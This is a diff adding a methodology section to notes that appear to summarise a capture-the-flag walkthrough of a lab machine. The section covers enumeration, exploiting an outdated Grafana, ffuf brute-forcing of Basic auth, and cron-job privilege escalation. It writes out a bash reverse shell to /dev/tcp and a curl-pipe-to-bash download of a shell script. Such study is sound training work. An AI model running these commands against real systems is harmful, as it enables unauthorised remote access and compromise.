@@ -69,3 +69,52 @@ The briefing concludes with an optional, advanced demonstration of using ffuf wi
 - sed is used to append the known password (S0 riot 3C) to each username in the wordlist, creating username:password pairs.
 - ffuf is then used with the enc encoder to Base64 encode the FUZZ payload before sending the request: ffuf -request login.request -request-proto http -w users.txt:FUZZ -enc FUZZ:b64 -mc all.
 - Filtering for a 200 status code (-fc 401) reveals the correct username that resulted in a successful login. This demonstrates how "fuff has encoders so we could like URL encode something we can base 64 encode."
+
+# Methodology
+### I. Advanced Reconnaissance and Enumeration
+
+1. **Comprehensive Port and Service Scanning:** Beyond basic port scans, use `nmap` with flags like `-sc` for default scripts, `-sv` for version enumeration, and `-vvv` for verbose output to get detailed information about open ports and running services.
+2. **Virtual Host Scanning:** This is crucial for discovering hidden subdomains, which often host vulnerable applications (e.g., `grafana.planning.htb`). Tools like **GoBuster** are essential, and you should understand their syntax, including options like `append domain` for accurate results.
+3. **Directory and File Enumeration:** Utilize tools like GoBuster with specific extensions (e.g., `.php`) to find potential files and directories that might reveal information or vulnerabilities.
+4. **Automated Vulnerability Scanning:** Incorporate tools like **Nuclei** to automatically identify common misconfigurations or known vulnerabilities that might be missed during manual checks.
+5. **Understanding HTTP Headers and their Security Implications:** While often seen as low-severity, learn the purpose of security headers (e.g., `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`). More importantly, learn how to **demonstrate the impact** of missing or misconfigured headers (e.g., how `X-Frame-Options` prevents clickjacking, or how `Content-Security-Policy` can mitigate Cross-Site Scripting) to make findings more impactful.
+6. **Fuzzing and Input Validation Testing:** Use tools like **Burp Suite** to intercept requests and test various inputs (e.g., single quotes, double quotes, SQL injection payloads like `1=1`, or wildcards like `%`) to identify error messages or behavioral changes that indicate vulnerabilities. Be aware that some websites might detect the use of proxies like Burp Suite.
+7. **Adding to Hosts File:** Practice adding discovered hostnames to your `/etc/hosts` file (e.g., `planning.htb`, `grafana.planning.htb`) to properly access web applications.
+
+### II. Vulnerability Identification and Exploitation
+
+1. **Identifying Out-of-Date Software:** Actively look for version numbers of running services or applications (e.g., Grafana 11.0.0). This is a strong indicator of potential vulnerabilities.
+2. **Leveraging Public Exploits and CVEs:**
+    - Learn to effectively use resources like **CVE Details** to find known vulnerabilities for specific products and versions.
+    - Search **GitHub** for Proof of Concepts (PoCs) related to identified CVEs.
+    - Understand how to set up and execute PoCs, including managing dependencies using Python virtual environments (`python3 -m venv`, `pip3 install -r requirements.txt`).
+3. **Crafting and Delivering Reverse Shells:**
+    - Understand the syntax for common reverse shell payloads (e.g., `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`).
+    - **Master the "Web Cradle" technique:** This involves setting up a simple HTTP server on your machine (`python3 -m http.server`) and having the target download and execute a shell script using `curl` (e.g., `curl http://YOUR_IP:PORT/shell.sh | bash`). This method is preferred for troubleshooting as it helps determine if network connectivity (outbound requests) or payload special characters are causing issues, making debugging much easier.
+4. **Advanced Brute-Forcing with Fuzzing Tools:** Learn to use tools like **Fuff** with encoders for more complex brute-forcing scenarios, such as HTTP Basic authentication. This involves understanding how to craft requests, use wordlists, apply encoders (e.g., Base64 encoding for `username:password`), and filter results to identify successful attempts. This provides a deeper understanding than relying solely on dedicated brute-forcing tools like Hydra.
+
+### III. Post-Exploitation and Privilege Escalation
+
+1. **Container Environment Awareness:** Recognize when you are in a Docker container (e.g., from hostname or specific file paths like `/docker-init`). Learn to check environment variables for credentials or other sensitive information within containers.
+2. **Local Host Enumeration:**
+    - **Process Monitoring:** Understand how to list running processes (`ps aux` or `ps -ef`), but also be aware of techniques like `hide_pid=2` that can limit visibility into processes run by other users.
+    - **Local Port Scanning:** Actively look for services listening on `localhost` (e.g., ports 8000, 3000) using `curl` or by examining configuration files. These internal services often contain vulnerabilities or credentials.
+    - **Database Investigation:** If database credentials are found, learn to connect to local databases (e.g., MySQL) and enumerate databases, tables, and their contents.
+3. **SSH Port Forwarding:** Master the use of SSH local port forwarding (`-L`) to access services listening only on `localhost` from your attacking machine, bridging the network gap.
+4. **Cron Job Analysis and Exploitation:**
+    - Locate and analyze cron job files (e.g., `crontab.db` in `/opt`) to understand scheduled tasks and their execution frequency.
+    - Identify opportunities to create **malicious cron jobs** for privilege escalation (e.g., creating a cron job that runs as root and executes your reverse shell or command).
+5. **Service Enumeration:** Explore system services (e.g., using `systemctl list-unit-files --type=service` or `find /etc/systemd -type f -name "*.service"`) to discover running applications and their configurations, which may reveal default credentials or vulnerabilities.
+6. **File System Review:** Systematically check common directories like `/opt` for installed applications or unusual files, and `/etc` for configuration files that might contain credentials or misconfigurations.
+7. **Parsing JSON Data:** Use tools like **`jq`** to pretty-print and easily read JSON formatted configuration files.
+
+### IV. General Tools and Mindset
+
+1. **Tool Mastery and Troubleshooting:**
+    - Continuously test your tools. CTFs are excellent opportunities to discover when a tool's syntax has changed or if it's not working as expected (e.g., GoBuster's behavior with virtual hosts).
+    - Learn to read and understand error messages, and consult documentation when tools behave unexpectedly.
+2. **Breaking Down Complex Tasks:** When an exploit fails or a payload doesn't work, learn to break down the process into smaller, testable steps. This helps pinpoint exactly where the issue lies (e.g., using the web cradle for reverse shells helps determine if the issue is network connectivity or payload syntax).
+3. **Text Manipulation with `sed`:** Become proficient with command-line tools like `sed` for tasks such as inserting specific strings (like `username:password`) into a wordlist, which is useful for advanced brute-forcing.
+4. **Attention to Detail:** Small details, like version numbers or specific error messages, can often be the key to finding and exploiting vulnerabilities.
+
+By focusing on these areas, you will develop a more robust skillset for tackling complex CTF challenges and understanding real-world penetration testing scenarios.
